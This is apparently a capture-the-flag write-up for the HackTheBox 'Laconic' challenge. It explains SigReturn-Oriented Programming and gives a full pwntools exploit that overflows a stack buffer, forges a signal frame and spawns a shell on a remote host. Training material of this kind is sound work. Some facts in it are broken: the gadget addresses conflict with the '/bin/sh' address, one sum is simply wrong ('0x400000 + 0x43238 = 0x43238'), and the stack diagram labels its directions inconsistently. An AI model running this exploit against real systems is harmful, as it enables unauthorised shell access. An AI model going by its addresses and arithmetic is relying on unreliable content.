# Laconic — HackTheBox Pwn Challenge Writeup

> **Category:** Pwn | **Technique:** SigReturn-Oriented Programming (SROP) | **Architecture:** x86-64

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Enumeration](#initial-enumeration)
   - [File Analysis](#file-analysis)
   - [String Analysis](#string-analysis)
   - [Disassembly Analysis](#disassembly-analysis)
3. [Finding Gadgets](#finding-gadgets)
4. [Understanding SROP](#understanding-srop)
   - [What is SROP?](#what-is-srop)
   - [How SROP Works](#how-srop-works)
   - [Why SROP Here?](#why-srop-here)
5. [Exploit Development](#exploit-development)
   - [Attack Plan](#attack-plan)
   - [Stack Layout Visualization](#stack-layout-visualization)
   - [Step-by-Step Execution Flow](#step-by-step-execution-flow)
   - [Full Exploit Script](#full-exploit-script)
6. [Running the Exploit](#running-the-exploit)
   - [Testing Locally](#testing-locally)
   - [Debugging with GDB](#debugging-with-gdb)
7. [Key Concepts](#key-concepts)
   - [SigreturnFrame Structure](#sigreturnframe-structure)
   - [Why rt_sigreturn?](#why-rt_sigreturn)
8. [Troubleshooting](#troubleshooting)
9. [References](#references)

---

## Challenge Overview

**Laconic** is a HackTheBox pwn challenge that demonstrates the power of **SigReturn-Oriented Programming (SROP)**. The binary is intentionally stripped down to a bare minimum — statically linked, with just a handful of gadgets — forcing you to leverage SROP as the exploitation primitive to ultimately spawn a shell.

### Challenge Description

> *Sir Alaric's struggles have plunged him into a deep and overwhelming sadness, leaving him unwilling to speak to anyone. Can you find a way to lift his spirits and bring back his courage?*

The flavour text hints at silence and minimalism — and the binary lives up to it. There's almost nothing to work with, which is exactly the point.

---

## Initial Enumeration

### File Analysis

Start by identifying what kind of binary we're dealing with:

```bash
$ file laconic
laconic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

**Key observations:**

| Property | Value | Significance |
|---|---|---|
| Architecture | x86-64 | 64-bit registers and calling conventions apply |
| Linking | Statically linked | No external libc — no `system()`, `puts()`, or PLT/GOT to abuse |
| Stripped | No (not stripped) | Symbol names are preserved, making analysis easier |

Because the binary is **statically linked**, classic ret2libc or GOT-overwrite techniques are off the table. We need to work with only what's inside the binary itself.

---

### String Analysis

```bash
$ strings laconic
__start
__bss_start
_edata
_end
.symtab
.strtab
.shstrtab
.shellcode
/bin/sh
```

**Important findings:**

- `/bin/sh` is **already present** inside the binary — we won't need to write it to memory ourselves.
- A `.shellcode` section exists but turns out to be unused in this exploit path.
- The binary is remarkably small; there's no standard C runtime, no `main()`, no nothing beyond the bare essentials.

---

### Disassembly Analysis

Disassemble the binary to understand what code actually runs:

```bash
$ objdump -d laconic -M intel
```

The sole meaningful function is `__start`:

```asm
0000000000430000 <__start>:
  430000:   xor    edi, edi        ; fd = 0  (stdin)
  430002:   mov    rsi, rsp        ; buf = stack pointer
  430005:   sub    rsi, 0x8        ; buf = rsp - 8
  430009:   mov    edx, 0x106      ; count = 262 bytes
  43000e:   xor    eax, eax        ; syscall number = 0 (read)
  430010:   syscall                ; read(0, rsp-8, 0x106)
  430012:   ret                    ; return
```

**Critical vulnerability:**

The `read` syscall reads up to **262 bytes (0x106)** into a buffer that sits only **8 bytes** below the current stack pointer (`rsp - 8`). This means:

- The buffer is 8 bytes.
- We can write 262 bytes.
- **254 bytes overflow** past the buffer directly into the return address and beyond.

This gives us full control over the return address and the entire subsequent stack — everything we need for SROP.

---

## Finding Gadgets

Given how minimal the binary is, there are very few usable gadgets. Here's what's available:

```bash
# Find pop rax; ret
$ objdump -d laconic | grep -A2 "pop"
0000000000430018 <gadget>:
  430018:   58      pop    rax
  430019:   c3      ret

# Find syscall instruction
$ objdump -d laconic | grep -A1 "syscall"
  430010:   0f 05   syscall      ; inside __start
  430015:   0f 05   syscall      ; standalone syscall gadget (if applicable)
```

**Available gadgets:**

| Gadget | Address | Purpose |
|---|---|---|
| `pop rax; ret` | `0x430018` | Load a value into `rax` (controls syscall number) |
| `syscall` | `0x430015` | Trigger a syscall with whatever is in registers |

**Address of `/bin/sh`:**

```bash
$ strings -t x laconic | grep /bin/sh
  43238 /bin/sh
```

So `/bin/sh` lives at virtual address `0x43238` (add the base `0x400000` if PIE is enabled — but this binary has no PIE, so the address is fixed).

**Summary of important addresses:**

```
SH_ADDR        = 0x43238   # "/bin/sh" string
SYSCALL_GADGET = 0x430015  # syscall instruction
POP_RAX_RET    = 0x430018  # pop rax; ret
```

---

## Understanding SROP

### What is SROP?

**SigReturn-Oriented Programming (SROP)** is a powerful exploitation technique that abuses the `rt_sigreturn` syscall (syscall number **15** on x86-64) to set **all CPU registers at once** using a single crafted structure on the stack.

It was first formally described in the 2014 paper *"Framing Signals — A Return to Portable Shellcode"* by Bosman & Bos.

---

### How SROP Works

To understand SROP, you first need to understand Unix signal handling:

1. **Signal delivery:** When the OS delivers a signal to a process, it saves the entire CPU state — every register — onto the process's stack in a structure called a `sigcontext` (or `ucontext`). This is called the **signal frame**.

2. **Signal handler executes:** The program's signal handler runs.

3. **Signal return:** When the handler finishes, it calls `rt_sigreturn`. The kernel reads the signal frame back off the stack and **restores all registers** from it, resuming normal execution.

4. **The attack:** As an attacker with stack control, we can **forge** a fake signal frame on the stack and trigger `rt_sigreturn` ourselves. The kernel doesn't validate the frame — it just trusts whatever is there. This means we get to set:
   - `rax` — syscall number
   - `rdi`, `rsi`, `rdx` — first three arguments
   - `rip` — instruction pointer (next instruction to execute)
   - Every other register

This is extraordinarily powerful: with just a `syscall` gadget and stack control, you can invoke **any syscall with any arguments**.

---

### Why SROP Here?

The Laconic binary is almost purpose-built for SROP because:

- **Minimal gadgets:** Only `pop rax; ret` and `syscall` are available — not enough for a traditional ROP chain to set `rdi`, `rsi`, `rdx`.
- **No libc:** Can't use ret2libc or one-gadgets.
- **Stack control:** The buffer overflow gives us full control of the stack.
- **`/bin/sh` already present:** No need to write any strings.
- **Fixed addresses:** No ASLR complications (statically linked, no PIE).

SROP lets us set all the registers we need (`rax=59`, `rdi=/bin/sh`, `rsi=0`, `rdx=0`) in one shot, making it the perfect — and arguably only — viable approach here.

---

## Exploit Development

### Attack Plan

Here is the high-level plan:

1. Send a payload that **overflows the 8-byte buffer** to overwrite the return address.
2. Return to `pop rax; ret` → load `rax = 15` (the `rt_sigreturn` syscall number).
3. Execute `syscall` → triggers `rt_sigreturn`.
4. The kernel reads our **forged `SigreturnFrame`** off the stack and restores registers:
   - `rax = 59` → `execve` syscall
   - `rdi = 0x43238` → pointer to `/bin/sh`
   - `rsi = 0` → `argv = NULL`
   - `rdx = 0` → `envp = NULL`
   - `rip = 0x430015` → the `syscall` gadget
5. Execution resumes at the `syscall` gadget with `rax=59` → `execve("/bin/sh", NULL, NULL)` fires.
6. **Shell spawned. 🚀**

---

### Stack Layout Visualization

Here's exactly what the stack looks like after we send our payload and the `ret` instruction fires:

```
Higher addresses
      │
      ▼
┌──────────────────────────┐  ← rsp - 8  (original buffer location)
│  "AAAAAAAA"  (8 bytes)   │  Fills the buffer — junk padding
├──────────────────────────┤  ← rsp       (return address slot)
│  0x430018  (POP_RAX_RET) │  Overwritten return address
├──────────────────────────┤
│  0x000000000000000F      │  Value popped into rax  (15 = rt_sigreturn)
├──────────────────────────┤
│  0x430015  (SYSCALL)     │  Return address after pop rax; ret
├──────────────────────────┤
│                          │
│    Forged SigreturnFrame │  Kernel reads this when rt_sigreturn runs
│  ┌────────────────────┐  │
│  │  rax  = 59         │  │  execve syscall number
│  │  rdi  = 0x43238    │  │  → "/bin/sh"
│  │  rsi  = 0x0        │  │  → argv = NULL
│  │  rdx  = 0x0        │  │  → envp = NULL
│  │  rip  = 0x430015   │  │  → syscall gadget (executes execve)
│  │  rsp  = 0x0        │  │  (not critical)
│  │  rbp  = 0x0        │  │  (not critical)
│  │  ...  (other regs) │  │  (zeroed out)
│  └────────────────────┘  │
└──────────────────────────┘
Lower addresses (top of stack growth direction)
```

---

### Step-by-Step Execution Flow

Let's trace every step from exploit send to shell:

| Step | What Happens |
|---|---|
| 1 | `read(0, rsp-8, 0x106)` — program waits for our 262-byte input |
| 2 | We send the payload; first 8 bytes fill the buffer |
| 3 | The next 8 bytes overwrite the return address with `POP_RAX_RET` (`0x430018`) |
| 4 | `__start` returns → CPU jumps to `pop rax; ret` |
| 5 | `pop rax` loads `15` into `rax`; `ret` jumps to `SYSCALL_GADGET` (`0x430015`) |
| 6 | `syscall` fires with `rax=15` → `rt_sigreturn` |
| 7 | Kernel reads our forged `SigreturnFrame` from the stack |
| 8 | All registers are restored: `rax=59`, `rdi=0x43238`, `rsi=0`, `rdx=0`, `rip=0x430015` |
| 9 | Execution resumes at `0x430015` (the `syscall` gadget) |
| 10 | `syscall` fires with `rax=59` → `execve("/bin/sh", NULL, NULL)` |
| 11 | Shell spawns 🎉 |

---

### Full Exploit Script

```python
#!/usr/bin/env python3
"""
Laconic — HackTheBox Pwn Challenge
Exploit Technique: SigReturn-Oriented Programming (SROP)

Author:  [your handle]
Date:    [date]
Target:  x86-64 statically linked ELF with minimal gadgets
"""

from pwn import *

# ─────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────
context.arch      = "amd64"
context.log_level = "info"   # Change to "debug" for verbose output

HOST = "83.136.251.145"   # Replace with actual target IP
PORT = 30750              # Replace with actual target port

# ─────────────────────────────────────────────
# Addresses (gathered during enumeration)
# ─────────────────────────────────────────────
SH_ADDR        = 0x43238   # Address of "/bin/sh" string in binary
SYSCALL_GADGET = 0x430015  # Address of bare `syscall` instruction
POP_RAX_RET    = 0x430018  # Address of `pop rax; ret` gadget

# ─────────────────────────────────────────────
# Syscall numbers (x86-64 Linux)
# ─────────────────────────────────────────────
SYS_RT_SIGRETURN = 15   # rt_sigreturn
SYS_EXECVE       = 59   # execve


def build_payload() -> bytes:
    """
    Construct the full SROP exploit payload.

    Layout:
      [padding 8B] [POP_RAX_RET] [15] [SYSCALL] [SigreturnFrame]
    """
    # ── 1. Padding to fill the 8-byte stack buffer ──────────────────────────
    payload = b"A" * 8

    # ── 2. Overwrite return address → pop rax; ret ───────────────────────────
    payload += p64(POP_RAX_RET)

    # ── 3. Value to load into rax (rt_sigreturn syscall number) ─────────────
    payload += p64(SYS_RT_SIGRETURN)

    # ── 4. After pop rax; ret → jump to syscall gadget ───────────────────────
    payload += p64(SYSCALL_GADGET)

    # ── 5. Forged SigreturnFrame ─────────────────────────────────────────────
    #   The kernel reads this structure when rt_sigreturn executes.
    #   We set registers for execve("/bin/sh", NULL, NULL).
    frame     = SigreturnFrame()
    frame.rax = SYS_EXECVE       # syscall: execve
    frame.rdi = SH_ADDR          # arg1:    pointer to "/bin/sh"
    frame.rsi = 0                # arg2:    argv  = NULL
    frame.rdx = 0                # arg3:    envp  = NULL
    frame.rip = SYSCALL_GADGET   # after restoring regs, execute syscall
    frame.rsp = 0                # not critical for this exploit
    frame.rbp = 0                # not critical for this exploit

    payload += bytes(frame)

    return payload


def exploit():
    """Main exploit entry point."""
    log.info("Building SROP payload...")
    payload = build_payload()
    log.info(f"Payload size: {len(payload)} bytes (max allowed: 262)")
    assert len(payload) <= 262, "Payload exceeds read() limit of 262 bytes!"

    # ── Connect ───────────────────────────────────────────────────────────────
    # For local testing, replace with:
    #   target = process("./laconic")
    target = remote(HOST, PORT)

    log.info("Sending exploit...")
    target.send(payload)

    log.success("Exploit sent! Dropping into interactive shell...")
    target.interactive()


if __name__ == "__main__":
    exploit()
```

---

## Running the Exploit

### Testing Locally

Before attacking the remote target, always test locally:

```bash
# Make the binary executable
$ chmod +x laconic

# Run the exploit against the local binary
# (edit the script to use process("./laconic") instead of remote())
$ python3 exploit.py

[*] Building SROP payload...
[*] Payload size: 248 bytes (max allowed: 262)
[*] Starting local process './laconic'
[+] Exploit sent! Dropping into interactive shell...
[*] Switching to interactive mode

$ whoami
user
$ ls
exploit.py  laconic  flag.txt
$ cat flag.txt
HTB{...}
```

### Debugging with GDB

Use GDB (ideally with the GEF or pwndbg extension) to step through the exploit:

```bash
# Start GDB on the binary
$ gdb ./laconic

# Set a breakpoint at the `ret` instruction in __start
gef➤  break *0x430012

# Run with the exploit payload piped in
gef➤  run < <(python3 -c "
from pwn import *
context.arch = 'amd64'
# ... paste payload building code here ...
sys.stdout.buffer.write(payload)
")

# Inspect registers after the overflow
gef➤  info registers

# Step through execution
gef➤  ni    # next instruction
gef➤  si    # step into syscall
```

**Useful GDB commands for this challenge:**

```bash
# Examine the stack at current rsp
gef➤  x/40gx $rsp

# Check where rip will land
gef➤  x/i $rip

# Inspect the forged frame on the stack
gef➤  x/20gx $rsp+24
```

---

## Key Concepts

### SigreturnFrame Structure

The `SigreturnFrame` (also called `sigcontext` in the kernel) is the structure the kernel uses to save and restore process state during signal handling. On x86-64 Linux, it contains all general-purpose registers plus segment registers, EFLAGS, and more:

```c
struct sigcontext {
    /* Extra registers saved by the OS */
    unsigned long r8, r9, r10, r11, r12, r13, r14, r15;

    /* General-purpose registers */
    unsigned long rdi, rsi, rbp, rbx, rdx, rax, rcx, rsp;

    /* Instruction pointer */
    unsigned long rip;

    /* Flags and segment registers */
    unsigned long eflags;
    unsigned short cs, gs, fs, ss, ds, es;

    /* Fault info */
    unsigned long err, trapno, oldmask, cr2;

    /* FPU state pointer */
    struct _fpstate *fpstate;

    unsigned long reserved1[8];
};
```

In our exploit, we only need to configure the registers relevant to `execve`:

| Register | Value | Meaning |
|---|---|---|
| `rax` | `59` | `execve` syscall number |
| `rdi` | `0x43238` | Pointer to `"/bin/sh"` |
| `rsi` | `0` | `argv = NULL` |
| `rdx` | `0` | `envp = NULL` |
| `rip` | `0x430015` | Resume execution at `syscall` gadget |

All other registers can be zeroed out — the kernel doesn't care about them for our purposes.

---

### Why rt_sigreturn?

`rt_sigreturn` is uniquely powerful as an exploitation primitive for several reasons:

| Advantage | Explanation |
|---|---|
| **Sets all registers at once** | No need for individual `pop reg; ret` gadgets for every register |
| **Only needs `syscall`** | A single `syscall` gadget + stack control is enough |
| **ASLR-resistant** | Works without any libc addresses — only needs addresses within the binary itself |
| **Minimal gadget requirement** | Perfect for stripped-down or minimal binaries like this one |
| **Bypasses stack canaries** | If you can overwrite past a canary to reach the return address, SROP still works |

The only requirement is:

1. Control of the stack (buffer overflow ✓)
2. A `syscall` gadget (present ✓)
3. A way to set `rax = 15` (`pop rax; ret` gadget ✓)

---

## Troubleshooting

### Wrong Addresses

If the exploit doesn't work, the first thing to double-check is your addresses:

```bash
# Re-verify the syscall gadget address
$ objdump -d laconic | grep -B1 "syscall"

# Re-verify the pop rax; ret gadget
$ objdump -d laconic | grep -A2 "pop.*rax"

# Re-verify /bin/sh address
$ strings -t x laconic | grep /bin/sh
# Output: "  43238 /bin/sh"
# Virtual address = 0x400000 (base) + 0x43238 = 0x43238
# (base is already included since this is shown as 0x43238 in a non-PIE binary)
```

### Payload Too Large

The `read` syscall accepts a maximum of **262 bytes (0x106)**. Make sure your payload fits:

```python
assert len(payload) <= 262, f"Payload too large: {len(payload)} bytes"
```

A typical SROP payload for this binary is ~248 bytes, safely within the limit.

### Connection Issues

```bash
# Verify the remote is up
$ nc -zv 83.136.251.145 30750

# Try with a longer timeout in pwntools
target = remote(HOST, PORT, timeout=30)
```

### Wrong Architecture Context

Make sure pwntools knows it's targeting a 64-bit binary:

```python
context.arch = "amd64"   # Required for SigreturnFrame to be sized correctly
```

Using the wrong architecture will cause `SigreturnFrame` to generate an incorrectly-sized structure, breaking the exploit.

---

## References

- **SROP Paper (2014):** ["Framing Signals — A Return to Portable Shellcode"](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf) — Bosman & Bos
- **pwntools SigreturnFrame:** [pwntools Documentation](https://docs.pwntools.com/en/stable/rop/srop.html)
- **x86-64 Linux Syscall Table:** [syscall.sh](https://syscall.sh/) or [filippo.io/linux-syscall-table](https://filippo.io/linux-syscall-table/)
- **GEF (GDB Enhanced Features):** [github.com/hugsy/gef](https://github.com/hugsy/gef)
- **pwndbg:** [github.com/pwndbg/pwndbg](https://github.com/pwndbg/pwndbg)
- **CTF Wiki on SROP:** [ctf-wiki.org/pwn/linux/user-mode/advanced-rop/srop/](https://ctf-wiki.org/pwn/linux/user-mode/advanced-rop/srop/)

---

## Summary

Laconic is an elegant demonstration of how a binary stripped to its absolute essentials can still be fully exploited — and how SROP turns a nearly empty gadget set into a complete exploitation primitive.

The full kill chain:

```
Buffer overflow → pop rax = 15 → syscall (rt_sigreturn)
  → Kernel restores forged frame (rax=59, rdi=/bin/sh, rip=syscall)
    → execve("/bin/sh", NULL, NULL) → shell
```

The challenge teaches a core lesson: **you don't need many gadgets if you pick the right one.** `rt_sigreturn` is that gadget.

---

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing exploits on any system you do not own.

---

*Happy Hacking! 🐧*
